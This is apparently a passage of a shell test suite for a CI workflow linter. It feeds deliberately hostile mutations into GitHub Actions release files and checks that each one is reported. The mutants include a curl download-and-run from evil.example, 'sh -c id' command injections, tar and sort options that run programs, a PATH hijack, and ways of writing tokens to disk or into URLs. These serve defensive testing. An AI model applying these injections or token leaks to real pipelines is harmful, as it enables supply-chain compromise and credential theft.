	expect_caught 'a heredoc, which the rule does not read (#1029)' runs "$WORKFLOWS/release-exec.yml" \
		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          echo <<EOF\n          sh -c id\n          EOF\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
		'publish-brain: step Publish to npm holds a heredoc, which this rule does not read'
	expect_caught 'an arithmetic command, which the rule does not read (#1029)' runs "$WORKFLOWS/release-exec.yml" \
		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          (( x[$(id)] ))\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
		'publish-brain: step Publish to npm holds an arithmetic command, which this rule does not read'
	expect_caught 'an integer test in [[ ]], which evaluates its operands (#1029)' runs "$WORKFLOWS/release-exec.yml" \
		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          [[ \x27x[$(id)]\x27 -eq 0 ]] || exit 1\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
		'publish-brain: step Publish to npm holds an integer comparison inside [[ ]], which this rule does not read'
	expect_caught 'the brain publish job renamed out of its list (#1029)' runs "$WORKFLOWS/release-exec.yml" \
		$'  publish-brain:\n' $'  publish-brain-2:\n' \
		'publish-brain-2: holds id-token and has no list of the commands it may run'
	# publish-sidecar, which runs far more.
	expect_caught 'a function of another step called where it is not defined (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
		'          sums="$(cd artifacts' $'          manifest .\n          sums="$(cd artifacts' \
		'publish-sidecar: step Record artifact digests calls manifest, a function this step does not define'
	expect_caught 'printf -v, which assigns a variable unseen (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
		'      - name: Record artifact digests' $'      - run: printf -v PATH %s /tmp/evil\n      - name: Record artifact digests' \
		'runs printf -v, which sets a variable this rule cannot see'
	expect_caught 'a directory outside sidecar/npm in the platform loop (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
		$'for platform in darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do\n            pkg_dir=' $'for platform in ../../../evil darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do\n            pkg_dir=' \
		'publish-sidecar: step Prepare platform packages loops over platform in ../../../evil darwin-arm64'
	expect_caught 'a command inside a for list (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
		$'for platform in darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do\n            pkg_dir=' $'for platform in $(sh -c id) darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do\n            pkg_dir=' \
		'publish-sidecar: step Prepare platform packages runs sh, which is not on the publish-sidecar list'
	expect_caught 'a command inside a case pattern (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
		'              darwin-*)' '              darwin-*|$(sh -c id))' \
		'publish-sidecar: step Prepare platform packages runs sh, which is not on the publish-sidecar list'
	expect_caught 'tar told to run a program on what it extracts (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
		'--no-same-owner --no-same-permissions' '--no-same-owner --no-same-permissions --to-command=sh' \
		'which is not one of the forms listed for tar'
	expect_caught 'sort told to run a compressor (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
		'LC_ALL=C sort -z' 'LC_ALL=C sort -z --compress-program=/tmp/x' \
		'publish-sidecar: step Record artifact digests runs "sort -z --compress-program=/tmp/x", which is not one of the forms listed for sort'
	expect_caught 'a repository script run by its path in the sidecar publish job (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
		'      - name: Record artifact digests' $'      - run: ./scripts/x.sh\n      - name: Record artifact digests' \
		'runs ./scripts/x.sh, which is not a plain command name this rule can check'
	# The list is exactly what the jobs run: an entry left behind is reported.
	expect_caught 'a listed form no step runs any more (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
		'xargs -0 -r sha256sum' 'xargs -0 sha256sum' \
		'publish-sidecar: runAllow lists the form "xargs -0 -r sha256sum", which no step of the job runs any more'
	# Security review of #1029: every job holding id-token, not only those
	# that run npm publish, the signers included.
	expect_caught 'an added id-token job that downloads and runs a file (security review of #1029)' runs "$WORKFLOWS/release-exec.yml" \
		$'\njobs:\n' $'\njobs:\n  exfil:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n    steps:\n      - run: curl -o /tmp/x https://evil.example/x; chmod +x /tmp/x; /tmp/x\n' \
		'exfil: holds id-token and has no list of the commands it may run'
	expect_caught 'a download run in the KMS signer of the sidecar (security review of #1029)' runs "$WORKFLOWS/sidecar-release.yml" \
		'        run: scripts/sign-windows.sh --defer-verify "${SIDECAR_BIN}.exe"' '        run: curl -o /tmp/x https://evil.example/x; chmod +x /tmp/x; /tmp/x; scripts/sign-windows.sh --defer-verify "${SIDECAR_BIN}.exe"' \
		'sign-sidecar-windows: step Sign Windows binary (Cloud KMS) runs /tmp/x, which is not a plain command name this rule can check'
	expect_caught 'the signing script run with other arguments (security review of #1029)' runs "$WORKFLOWS/installer-release.yml" \
		'        run: scripts/sign-windows.sh --defer-verify Jarvis-Setup.exe' '        run: scripts/sign-windows.sh --defer-verify /tmp/evil.exe' \
		'which is not one of the forms listed for scripts/sign-windows.sh'
	expect_caught 'a publish step in a shell the rule does not read (security review of #1029)' runs "$WORKFLOWS/release-exec.yml" \
		$'      - name: Publish to npm\n        env:\n' $'      - name: Publish to npm\n        shell: python {0}\n        env:\n' \
		'publish-brain: step Publish to npm runs in shell: python {0}, which this rule does not read'
	# Review of #1029: values reach the pinned forms, so they are listed too.
	expect_caught 'VERSION reassigned so the pinned sed -i runs a sed script of its own (review of #1029)' runs "$WORKFLOWS/sidecar-release.yml" \
		'            sed -i "s|' $'            VERSION="1|e id|"\n            sed -i "s|' \
		'publish-sidecar: step Prepare platform packages assigns "VERSION=\"1|e id|\"", which is not on the publish-sidecar list'
	expect_caught 'a listed assignment changed (review of #1029)' runs "$WORKFLOWS/release-exec.yml" \
		'          pkg="@usejarvis/brain"' '          pkg="@usejarvis/brain-evil"' \
		'publish-brain: runAllow lists the assignment "pkg=\"@usejarvis/brain\"", which no step of the job runs any more'
	expect_caught 'a listed function called on another directory (review of #1029)' runs "$WORKFLOWS/sidecar-release.yml" \
		'            ours="$(manifest .)"' '            ours="$(manifest /)"' \
		'publish-sidecar: step Publish platform packages calls "manifest /", which is not one of the calls listed'
	expect_caught 'a nameref declared by local, so a later assignment writes PATH (review of #1029)' runs "$WORKFLOWS/sidecar-release.yml" \
		'            local url integrity tmp got names types ours theirs' '            local -n url=PATH integrity tmp got names types ours theirs' \
		'which is not one of the forms listed for local'
	expect_caught 'mktemp making files where it is told (review of #1029)' runs "$WORKFLOWS/sidecar-release.yml" \
		'          err="$(mktemp)"' '          err="$(mktemp -p /usr/local/bin)"' \
		'publish-sidecar: step Publish platform packages runs "mktemp -p /usr/local/bin", which is not one of the forms listed for mktemp'
	expect_caught 'diff told to run pr (review of #1029)' runs "$WORKFLOWS/sidecar-release.yml" \
		"diff <(printf '%s\\n' \"\$want\")" "diff -l <(printf '%s\\n' \"\$want\")" \
		'which is not one of the forms listed for diff'
	expect_caught 'another publishing job, its publish on a continued line (review of #1029)' runs "$WORKFLOWS/release-exec.yml" \
		$'\njobs:\n' $'\njobs:\n  sneak:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n    steps:\n      - run: |\n          npm \\\n            publish x.tgz\n' \
		'sneak: holds id-token and has no list of the commands it may run'
	expect_caught 'another publishing job, npm quoted (review of #1029)' runs "$WORKFLOWS/release-exec.yml" \
		$'\njobs:\n' $'\njobs:\n  sneak:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n    steps:\n      - run: \x27"npm" publish x.tgz\x27\n' \
		'sneak: holds id-token and has no list of the commands it may run'
	# #870 review: the macOS signers run only their listed commands; each of
	# these passed the narrow deny list.
	SDU=$'      - name: Unpack the bundles\n        run: |\n          set -euo pipefail\n'
	expect_caught 'bash running a repository file in the macOS signer (#870 review)' runs "$WORKFLOWS/sidecar-release.yml" \
		"$SDU" "${SDU}          bash packaging/macos/x"$'\n' \
		'sign-sidecar-darwin: step Unpack the bundles runs bash, which is not on the sign-sidecar-darwin list'
	expect_caught 'zsh -f running a repository file in the macOS signer (#870 review)' runs "$WORKFLOWS/sidecar-release.yml" \
		"$SDU" "${SDU}          zsh -f packaging/macos/x"$'\n' \
		'sign-sidecar-darwin: step Unpack the bundles runs zsh, which is not on the sign-sidecar-darwin list'
	expect_caught 'osascript running a repository script in the macOS signer (#870 review)' runs "$WORKFLOWS/sidecar-release.yml" \
		"$SDU" "${SDU}          osascript packaging/macos/x.applescript"$'\n' \
		'sign-sidecar-darwin: step Unpack the bundles runs osascript, which is not on the sign-sidecar-darwin list'
	expect_caught 'arch running a repository file in the macOS signer (#870 review)' runs "$WORKFLOWS/sidecar-release.yml" \
		"$SDU" "${SDU}          arch -arm64 packaging/macos/x"$'\n' \
		'sign-sidecar-darwin: step Unpack the bundles runs arch, which is not on the sign-sidecar-darwin list'
	expect_caught 'env -S running a repository file in the macOS signer (#870 review)' runs "$WORKFLOWS/sidecar-release.yml" \
		"$SDU" "${SDU}          /usr/bin/env -S packaging/macos/x"$'\n' \
		'sign-sidecar-darwin: step Unpack the bundles runs /usr/bin/env, which is not a plain command name this rule can check'
	expect_caught 'xattr writing to the bundle in the macOS signer (#870 review)' runs "$WORKFLOWS/sidecar-release.yml" \
		"$SDU" "${SDU}          xattr -w com.example.x y \"\${RUNNER_TEMP}/work\""$'\n' \
		'sign-sidecar-darwin: step Unpack the bundles runs xattr, which is not on the sign-sidecar-darwin list'
	expect_caught 'codesign run in a form not listed in the installer signer (#870 review)' runs "$WORKFLOWS/installer-release.yml" \
		'          codesign --verify --strict --verbose=2 "$APP"' '          codesign --verify --strict --verbose=2 "$APP" --entitlements /tmp/x' \
		'which is not one of the forms listed for codesign'
	expect_caught 'another job handed the Apple secrets with no list of its own (#870 review)' runs "$WORKFLOWS/installer-release.yml" \
		$'\njobs:\n' $'\njobs:\n  sneak:\n    runs-on: macos-latest\n    permissions:\n      contents: read\n    steps:\n      - run: echo x\n        env:\n          K: ${{ secrets.ASC_API_KEY_P8 }}\n' \
		'sneak: reads the Apple signing secrets and has no list of the commands it may run'
}

echo
echo "no checkout leaves a write token or a secret on disk, and a push brings its own credential (#982)"
# shellcheck disable=SC2016 # literal workflow text, not shell.
{
	expect_caught 'the release cut job leaving its PAT in .git/config (#982)' narrow "$WORKFLOWS/release.yml" \
		$'          token: ${{ secrets.RELEASE_PR_TOKEN }}\n          persist-credentials: false\n' $'          token: ${{ secrets.RELEASE_PR_TOKEN }}\n' \
		'cut: checkout leaves the token in .git/config'
	expect_caught 'the release cut job persisting its PAT on purpose (#982)' narrow "$WORKFLOWS/release.yml" \
		$'          token: ${{ secrets.RELEASE_PR_TOKEN }}\n          persist-credentials: false\n' $'          token: ${{ secrets.RELEASE_PR_TOKEN }}\n          persist-credentials: true\n' \
		'cut: checkout leaves the token in .git/config'
	# The webview build job is read-only since #983, so a copy gives it its
	# old write scope back first: what is tested is a write-scoped job off
	# the release path, as before the split.
	FROM="$WORKFLOWS/update-webview.yml" TO="${WORK}/uw-write.yml" bun -e '
const s = await Bun.file(process.env.FROM).text();
const old = "    timeout-minutes: 30\n    permissions:\n      contents: read\n";
if (!s.includes(old)) process.exit(2);
await Bun.write(process.env.TO, s.replace(old, "    timeout-minutes: 30\n    permissions:\n      contents: write\n"));
' || no "the webview build job write-scope copy could be made (update-webview.yml no longer has the text it mutates)"
	expect_caught 'a write-scoped job off the release path persisting its token (#982)' narrow "${WORK}/uw-write.yml" \
		$'        with:\n          persist-credentials: false\n      - uses: actions/setup-go@' '      - uses: actions/setup-go@' \
		'build: checkout leaves the token in .git/config'
	expect_caught 'a read-only job persisting a secret it checked out with (#982)' narrow "$WORKFLOWS/docker-build.yml" \
		$'        with:\n          persist-credentials: false\n\n      - name: Set up Docker Buildx\n' $'        with:\n          token: ${{ secrets.SOME_PAT }}\n\n      - name: Set up Docker Buildx\n' \
		'docker-build: checkout leaves the token in .git/config'
	expect_caught 'the same checkout spelled in another case (#982)' narrow "$WORKFLOWS/docker-build.yml" \
		$'      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n' $'      - with:\n          token: ${{ secrets.SOME_PAT }}\n        uses: Actions/Checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n' \
		'docker-build: checkout leaves the token in .git/config'
	expect_caught 'the release branch pushed with no credential helper (#982)' narrow "$WORKFLOWS/release.yml" \
		$'          GIT_CONFIG_KEY_1: credential.https://github.com.helper\n' '' \
		'cut: step Create release PR runs git against a remote with no credential'
	expect_caught 'the release branch pushed with an empty credential helper (#982)' narrow "$WORKFLOWS/release.yml" \
		"          GIT_CONFIG_VALUE_1: '!f()" $'          GIT_CONFIG_VALUE_1: ""\n          x-was: \'!f()' \
		'cut: step Create release PR runs git against a remote with no credential'
	expect_caught 'the release branch delete back on git, with no credential (#982)' narrow "$WORKFLOWS/release.yml" \
		'          if ! gh api -X DELETE "repos/${GITHUB_REPOSITORY}/git/refs/heads/release/v${NEW}"; then' '          if ! git push origin --delete "release/v${NEW}"; then' \
		'cut: step Delete release branch runs git against a remote with no credential'
	expect_caught 'the cleanup delete back on git -C, with no credential (#982)' narrow "$WORKFLOWS/release.yml" \
		'          if [ -n "$NEW" ] && ! gh api -X DELETE "repos/${GITHUB_REPOSITORY}/git/refs/heads/release/v${NEW}"; then' '          if [ -n "$NEW" ] && ! git -C . push origin --delete "release/v${NEW}"; then' \
		'cut: step Clean up on failure runs git against a remote with no credential'
	expect_caught 'the release branch pushed with the token in its URL (#982)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' '          git push "https://x-access-token:${GH_TOKEN}@github.com/${GITHUB_REPOSITORY}.git" "$BRANCH"' \
		'cut: puts a credential in a URL'
	expect_caught 'the token in a URL as a spaced expression (#982 review)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' '          git push "https://x-access-token:${{ secrets.RELEASE_PR_TOKEN }}@github.com/${GITHUB_REPOSITORY}.git" "$BRANCH"' \
		'cut: puts a credential in a URL'
	expect_caught 'the token in a URL split by quotes (#982 review)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' '          git push "https://x-access-token:"$GH_TOKEN"@github.com/${GITHUB_REPOSITORY}.git" "$BRANCH"' \
		'cut: puts a credential in a URL'
	expect_caught 'the token in a URL held in step env (#982 review)' narrow "$WORKFLOWS/release.yml" \
		'          GIT_TERMINAL_PROMPT: "0"' $'          PUSH_URL: https://x-access-token:${{ secrets.RELEASE_PR_TOKEN }}@github.com/vierisid/jarvis.git\n          GIT_TERMINAL_PROMPT: "0"' \
		'cut: puts a credential in a URL'
	expect_caught 'a storing helper as the reset entry (#982 review)' narrow "$WORKFLOWS/release.yml" \
		'          GIT_CONFIG_VALUE_0: ""' '          GIT_CONFIG_VALUE_0: store' \
		'cut: step Create release PR configures the credential helper "store"'
	expect_caught 'the helper beyond GIT_CONFIG_COUNT, so git never reads it (#982 review)' narrow "$WORKFLOWS/release.yml" \
		'          GIT_CONFIG_COUNT: "2"' '          GIT_CONFIG_COUNT: "1"' \
		'cut: step Create release PR runs git against a remote with no credential'
	expect_caught 'the PAT written back into .git/config as an extraheader (#982 review)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' $'          git config http.https://github.com/.extraheader "AUTHORIZATION: basic x"\n          git push origin "$BRANCH"' \
		'cut: writes a git credential where every later step can read it'
	expect_caught 'an extraheader on the git command line (#982 review)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' '          git -c http.extraheader="AUTHORIZATION: basic x" push origin "$BRANCH"' \
		'cut: writes a git credential where every later step can read it'
	expect_caught 'a .git-credentials file written (#982 review)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' $'          printf \x27https://x:%s@github.com\\n\x27 "$GH_TOKEN" >~/.git-credentials\n          git push origin "$BRANCH"' \
		'cut: writes a git credential where every later step can read it'
	expect_caught 'a remote git command continued onto the next line (#982 review)' narrow "$WORKFLOWS/release.yml" \
		'          if ! gh api -X DELETE "repos/${GITHUB_REPOSITORY}/git/refs/heads/release/v${NEW}"; then' $'          if ! git \\\n            push origin --delete "release/v${NEW}"; then' \
		'cut: step Delete release branch runs git against a remote with no credential'
	expect_caught 'a remote git command behind --git-dir (#982 review)' narrow "$WORKFLOWS/release.yml" \
		'          if ! gh api -X DELETE "repos/${GITHUB_REPOSITORY}/git/refs/heads/release/v${NEW}"; then' '          if ! git --git-dir .git push origin --delete "release/v${NEW}"; then' \
		'cut: step Delete release branch runs git against a remote with no credential'
	expect_caught 'git config in the job env, reaching every step (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		$'    env:\n      GH_TOKEN: ${{ github.token }}\n' $'    env:\n      GH_TOKEN: ${{ github.token }}\n      GIT_CONFIG_COUNT: "1"\n      GIT_CONFIG_KEY_0: http.https://github.com/.extraheader\n      GIT_CONFIG_VALUE_0: "AUTHORIZATION: basic ${{ secrets.RELEASE_PR_TOKEN }}"\n' \
		'cut: job env sets GIT_CONFIG_COUNT'
	expect_caught 'an extraheader given in the step env (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		'          GIT_CONFIG_KEY_0: credential.helper' '          GIT_CONFIG_KEY_0: http.https://github.com/.extraheader' \
		'cut: step Create release PR sets http.https://github.com/.extraheader through the environment'
	expect_caught 'GIT_CONFIG_PARAMETERS in the step env (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		'          GIT_TERMINAL_PROMPT: "0"' $'          GIT_CONFIG_PARAMETERS: "\x27credential.helper\x27=\x27store\x27"\n          GIT_TERMINAL_PROMPT: "0"' \
		'cut: step Create release PR sets GIT_CONFIG_PARAMETERS'
	expect_caught 'an inline helper that calls the storing one (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		'          GIT_CONFIG_VALUE_0: ""' '          GIT_CONFIG_VALUE_0: "!git credential-store"' \
		'configures the credential helper "!git credential-store"'
	expect_caught 'the helper key spelled with a leading zero, which git never reads (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		$'          GIT_CONFIG_KEY_1: credential.https://github.com.helper\n          GIT_CONFIG_VALUE_1: ' $'          GIT_CONFIG_KEY_01: credential.https://github.com.helper\n          GIT_CONFIG_VALUE_01: ' \
		'cut: step Create release PR runs git against a remote with no credential'
	expect_caught 'an extraheader written across a continuation line (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' $'          git config --global \\\n            http.https://github.com/.extraheader "AUTHORIZATION: basic x"\n          git push origin "$BRANCH"' \
		'cut: writes a git credential where every later step can read it'
	expect_caught 'a storing helper on a continued command line (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' $'          git -c \\\n            credential.helper=store push origin "$BRANCH"' \
		'cut: writes a git credential where every later step can read it'
	expect_caught 'an insteadOf carrying the token (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' $'          git config url.https://x@github.com/.insteadOf https://github.com/\n          git push origin "$BRANCH"' \
		'cut: writes a git credential where every later step can read it'
	expect_caught 'the storing helper run directly (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' $'          printf \x27protocol=https\\nhost=github.com\\nusername=x\\npassword=%s\\n\x27 "$GH_TOKEN" | git credential-store store\n          git push origin "$BRANCH"' \
		'cut: writes a git credential where every later step can read it'
	expect_caught 'gh auth login, which writes the token under ~/.config (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' $'          gh auth login --with-token <<<"$GH_TOKEN"\n          git push origin "$BRANCH"' \
		'cut: writes a git credential where every later step can read it'
	expect_caught 'a .netrc written with no space before it (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' $'          echo "machine github.com password $GH_TOKEN" >.netrc\n          git push origin "$BRANCH"' \
		'cut: writes a git credential where every later step can read it'
	expect_caught 'a .gitconfig written by hand (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' $'          printf \x27[credential]\\n\\thelper = store\\n\x27 >>~/.gitconfig\n          git push origin "$BRANCH"' \
		'cut: writes a git credential where every later step can read it'
	expect_caught 'the token in a URL held in workflow env (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		$'jobs:\n  cut:\n' $'env:\n  PUSH_URL: https://x-access-token:${{ secrets.RELEASE_PR_TOKEN }}@github.com/vierisid/jarvis.git\njobs:\n  cut:\n' \
		'cut: puts a credential in a URL'
	expect_caught 'the token in a URL through format() (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		'          GIT_TERMINAL_PROMPT: "0"' $'          PUSH_URL: https://x-access-token:${{ format(\x27{0}\x27, secrets.RELEASE_PR_TOKEN) }}@github.com/vierisid/jarvis.git\n          GIT_TERMINAL_PROMPT: "0"' \
		'cut: puts a credential in a URL'
	expect_caught 'the token in a URL through a command substitution (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' '          git push "https://x-access-token:$(printenv GH_TOKEN)@github.com/${GITHUB_REPOSITORY}.git" "$BRANCH"' \
		'cut: puts a credential in a URL'
	expect_caught 'the token in a URL built by printf (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' $'          url="$(printf \x27https://x-access-token:%s@github.com/%s.git\x27 "$GH_TOKEN" "$GITHUB_REPOSITORY")"\n          git push "$url" "$BRANCH"' \
		'cut: puts a credential in a URL'
}
# The helper itself, executed (#982): git asks it exactly as `git credential
# fill` does, with the step env as the workflow writes it and each expression
# replaced by a marker, and nothing else (no user or system git config, no
# inherited GIT_* variables). For github.com it must answer with the value of
# secrets.RELEASE_PR_TOKEN, for any other host with nothing, and with that
# secret empty with nothing, and git may never fall back to a prompt.
# push_cred_check <workflow>: one violation per line, nothing when clean.
push_cred_check() {
	# shellcheck disable=SC2016 # JavaScript source, not shell.
	FILE="$1" SCRATCH="${WORK}/pushcred" bun -e '
const fs = require("node:fs");
const doc = Bun.YAML.parse(fs.readFileSync(process.env.FILE, "utf8"));
const out = [];
fs.rmSync(process.env.SCRATCH, { recursive: true, force: true });
fs.mkdirSync(process.env.SCRATCH + "/home", { recursive: true });
let found = 0;
for (const [name, job] of Object.entries(doc.jobs ?? {}))
  for (const [i, st] of (job.steps ?? []).entries()) {
    // Any git push in the step, wherever it sits in a line.
    if (typeof st.run !== "string" || !/(?:^|[;&|(!{`]\s*|\b(?:then|do|else|if|elif|while|until)\s+)git\s+(?:-\S+\s+(?:[^\s-]\S*\s+)?)*push\b/m.test(st.run.replace(/\\\n/g, " "))) continue;
    found++;
    const label = name + ": step " + (st.name ?? st.id ?? String(i));
    const env = {};
    let pat = null;
    // The env the step runs with: workflow, job, then step.
    for (const [k, v] of Object.entries({ ...(doc.env ?? {}), ...(job.env ?? {}), ...(st.env ?? {}) })) {
      const s = String(v);
      if (/^\$\{\{\s*secrets\.RELEASE_PR_TOKEN\s*\}\}$/.test(s)) { env[k] = "pat-marker-" + k; pat = k; }
      else env[k] = s.includes("${{") ? "expr-marker-" + k : s;
    }
    if (env.GIT_TERMINAL_PROMPT !== "0") { out.push(label + ": GIT_TERMINAL_PROMPT is not 0, so a missing credential can wait on a prompt"); continue; }
    const fill = (host, extra = {}) => {
      const r = Bun.spawnSync(["git", "credential", "fill"], {
        cwd: process.env.SCRATCH, timeout: 20000,
        env: { PATH: process.env.PATH, HOME: process.env.SCRATCH + "/home", GIT_CONFIG_NOSYSTEM: "1", GIT_CONFIG_GLOBAL: "/dev/null", ...env, ...extra },
        stdin: Buffer.from("protocol=https\nhost=" + host + "\npath=vierisid/jarvis\n\n"),
      });
      return { code: r.exitCode, text: r.stdout.toString() };
    };
    const gh = fill("github.com");
    const pw = /^password=(.*)$/m.exec(gh.text)?.[1];
    if (!pat) out.push(label + ": no step env carries secrets.RELEASE_PR_TOKEN alone, so the push is not made by the PAT");
    else if (gh.code !== 0 || pw !== "pat-marker-" + pat) out.push(label + ": git gets " + JSON.stringify(pw ?? null) + " for github.com, not secrets.RELEASE_PR_TOKEN (exit " + gh.code + ")");
    // After a push git hands the credential back (approve), which is when a
    // storing helper writes it down; nothing may then hold the marker.
    if (gh.code === 0) {
      Bun.spawnSync(["git", "credential", "approve"], {
        cwd: process.env.SCRATCH, timeout: 20000,
        env: { PATH: process.env.PATH, HOME: process.env.SCRATCH + "/home", GIT_CONFIG_NOSYSTEM: "1", GIT_CONFIG_GLOBAL: "/dev/null", ...env },
        stdin: Buffer.from(gh.text + "\n"),
      });
      const kept = (dir) => fs.readdirSync(dir, { recursive: true, withFileTypes: true }).filter((e) => e.isFile())
        .filter((e) => fs.readFileSync(require("node:path").join(e.parentPath ?? e.path, e.name), "utf8").includes("pat-marker-"));
      if (kept(process.env.SCRATCH).length) out.push(label + ": the push credential is written to disk after the push (a storing helper)");
    }
    const other = fill("example.com");
    if (other.code === 0 || /marker/.test(other.text)) out.push(label + ": the push credential is offered to a host other than github.com");
    if (pat) {
      const empty = fill("github.com", { [pat]: "" });
      if (empty.code === 0) out.push(label + ": with secrets.RELEASE_PR_TOKEN empty git still gets a credential");
    }
  }
if (!found) out.push("no step runs git push, so the push credential check checked nothing");
// The PAT is read exactly three times: the refusal, the checkout token
// (persisted nowhere) and the push step env. Anywhere else it reaches code
// this check has not looked at.
const patReads = [...JSON.stringify({ env: doc.env, jobs: doc.jobs }).matchAll(/\$\{\{([\s\S]*?)\}\}/g)]
  .filter((m) => /\bsecrets\s*(?:\.\s*RELEASE_PR_TOKEN\b|\[)|\btoJSON\s*\(\s*secrets\b/i.test(m[1])).length;
if (patReads !== 3) out.push("secrets.RELEASE_PR_TOKEN is read " + patReads + " times; expected 3 (the refusal env, the checkout token, the push step env)");
if (out.length) console.log(out.join("\n"));
'
}
found="$(push_cred_check "$WORKFLOWS/release.yml")"
if [ -z "$found" ]; then
	ok "release.yml: the branch push gets secrets.RELEASE_PR_TOKEN from its step env, for github.com alone (#982)"
else
	no "release.yml: the branch push gets secrets.RELEASE_PR_TOKEN from its step env, for github.com alone (#982)" "$found"
fi
# push_cred_caught <label> <exact text> <replacement> <reason>
push_cred_caught() {
	local copy="${WORK}/release-push.yml"
	if ! FROM="$WORKFLOWS/release.yml" TO="$copy" OLD="$2" NEW="$3" bun -e '
const s = await Bun.file(process.env.FROM).text();
if (!s.includes(process.env.OLD)) { console.error("anchor not found"); process.exit(2); }
await Bun.write(process.env.TO, s.replace(process.env.OLD, () => process.env.NEW));
'; then
		no "push credential mutant '$1' could be applied (release.yml no longer has the text it mutates)"
		return
	fi
	found="$(push_cred_check "$copy")"
	if grep -qF -- "$4" <<<"$found"; then ok "reports: $1"; else no "reports: $1, for the reason it exists" "wanted '${4}', got: ${found}"; fi
}
# shellcheck disable=SC2016 # literal workflow text, not shell.
{
	push_cred_caught 'the helper answering for every host (#982)' \
		'          GIT_CONFIG_KEY_1: credential.https://github.com.helper' '          GIT_CONFIG_KEY_1: credential.helper' \
		'offered to a host other than github.com'
	push_cred_caught 'the helper reading a variable the step does not set (#982)' \
		'password=%s\n" "$GH_TOKEN"' 'password=%s\n" "$PUSH_TOKEN"' \
		'not secrets.RELEASE_PR_TOKEN'
	push_cred_caught 'the push made with the job token instead of the PAT (#982)' \
		$'          GH_TOKEN: ${{ secrets.RELEASE_PR_TOKEN }}\n          # The branch push' $'          GH_TOKEN: ${{ github.token }}\n          # The branch push' \
		'no step env carries secrets.RELEASE_PR_TOKEN alone'
	push_cred_caught 'the helper answering with the token empty (#982)' \
		'] && [ -n "$GH_TOKEN" ]; then' ']; then' \
		'with secrets.RELEASE_PR_TOKEN empty git still gets a credential'
	push_cred_caught 'a storing helper as the reset entry, writing the PAT after the push (#982 review)' \
		'          GIT_CONFIG_VALUE_0: ""' '          GIT_CONFIG_VALUE_0: store' \
		'written to disk after the push'
	push_cred_caught 'a second push mid-line, with no helper of its own (#982 review 2)' \
		'          if ! gh api -X DELETE "repos/${GITHUB_REPOSITORY}/git/refs/heads/release/v${NEW}"; then' '          if ! git push origin --delete "release/v${NEW}"; then' \
		'cut: step Delete release branch: GIT_TERMINAL_PROMPT is not 0'
	push_cred_caught 'the PAT read by another step (#982 review 2)' \
		'          PR_URL: ${{ steps.pr.outputs.PR_URL }}' $'          PR_URL: ${{ steps.pr.outputs.PR_URL }}\n          EXTRA: ${{ secrets.RELEASE_PR_TOKEN }}' \
		'secrets.RELEASE_PR_TOKEN is read 4 times'
	push_cred_caught 'git allowed to prompt for a credential (#982)' \
		'          GIT_TERMINAL_PROMPT: "0"' '          GIT_TERMINAL_PROMPT: "1"' \
		'GIT_TERMINAL_PROMPT is not 0'
}

echo
echo "the webview_go bump PR is opened with the PAT, by a job that runs no upstream code (#983)"
# shellcheck disable=SC2016 # literal workflow text, not shell.
{
	expect_caught 'the webview PR falling back to GITHUB_TOKEN again, as before #983' catalog-pr "$WORKFLOWS/update-webview.yml" \
		'          token: ${{ secrets.RELEASE_PR_TOKEN }}' '          token: ${{ secrets.WEBVIEW_BOT_TOKEN || secrets.GITHUB_TOKEN }}' \
		'publish: step Open / update the bump PR: token is "${{ secrets.WEBVIEW_BOT_TOKEN || secrets.GITHUB_TOKEN }}", not secrets.RELEASE_PR_TOKEN alone'
	expect_caught 'the webview PR opened with the default token (#983)' catalog-pr "$WORKFLOWS/update-webview.yml" \
		$'          token: ${{ secrets.RELEASE_PR_TOKEN }}\n' '' \
		'token is "the default github.token"'
